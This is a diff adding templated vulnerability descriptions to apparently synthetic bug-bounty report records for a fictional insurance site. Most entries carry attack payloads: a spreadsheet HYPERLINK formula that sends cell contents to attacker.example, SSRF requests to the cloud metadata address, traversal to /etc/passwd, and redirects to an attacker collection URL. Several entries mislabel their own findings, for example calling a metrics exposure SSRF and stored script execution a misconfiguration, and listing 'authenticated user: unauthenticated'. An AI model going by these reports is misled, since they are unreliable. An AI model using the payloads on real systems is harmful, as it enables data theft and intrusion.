+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.silberkamm-insurance.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2879,7 +2901,8 @@
           "offset": "1d 4h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.silberkamm-insurance.foo/export?type=records`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3015,7 +3038,8 @@
           "offset": "4d 16h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.silberkamm-insurance.foo/console/queue`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3100,7 +3124,8 @@
           "offset": "1d 9h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.silberkamm-insurance.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3260,7 +3285,8 @@
           "offset": "5d 5h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.silberkamm-insurance.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3436,7 +3462,8 @@
           "offset": "4d 6h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.silberkamm-insurance.foo/fetch`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3568,7 +3595,8 @@
           "offset": "5d 16h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.silberkamm-insurance.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3735,7 +3763,8 @@
           "offset": "4d 17h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.silberkamm-insurance.foo/console/queue`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3859,7 +3888,8 @@
           "offset": "5d 9h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.silberkamm-insurance.foo/profile`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3979,7 +4009,8 @@
           "offset": "2d 16h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.silberkamm-insurance.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4109,7 +4140,8 @@
           "offset": "12h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.silberkamm-insurance.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4217,7 +4249,8 @@
           "offset": "3d 18h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.silberkamm-insurance.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4372,7 +4405,8 @@
           "offset": "6d 13h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.silberkamm-insurance.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4507,7 +4541,8 @@
           "offset": "3d 18h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.silberkamm-insurance.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4671,7 +4706,8 @@
           "offset": "5d 1h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.silberkamm-insurance.foo/admin/queue`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -4802,7 +4838,8 @@
           "offset": "18h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.silberkamm-insurance.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4945,7 +4982,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.silberkamm-insurance.foo/api/import`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5081,7 +5119,8 @@
           "offset": "1d 9h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.silberkamm-insurance.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5265,7 +5304,8 @@
           "offset": "4d 20h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.silberkamm-insurance.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5381,7 +5421,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.silberkamm-insurance.foo/export?type=records`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5512,7 +5553,8 @@
           "offset": "2d 22h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.silberkamm-insurance.foo/export`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5644,7 +5686,8 @@
           "offset": "5d 18h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.silberkamm-insurance.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5774,7 +5817,8 @@
           "offset": "6d",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.silberkamm-insurance.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5938,7 +5982,8 @@
           "offset": "1d 8h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.silberkamm-insurance.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6093,7 +6138,8 @@
           "offset": "5d 16h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.silberkamm-insurance.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6212,7 +6258,8 @@
           "offset": "5d 3h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.silberkamm-insurance.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6299,7 +6346,8 @@
           "offset": "20h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.silberkamm-insurance.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6419,7 +6467,8 @@
           "offset": "23h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.silberkamm-insurance.foo/api/me`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6526,7 +6575,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.silberkamm-insurance.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6662,7 +6712,8 @@
           "offset": "1d 19h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.silberkamm-insurance.foo/import`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6804,7 +6855,8 @@
           "offset": "5d 12h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.silberkamm-insurance.foo/admin/items`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -6960,7 +7012,8 @@
           "offset": "6d 19h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
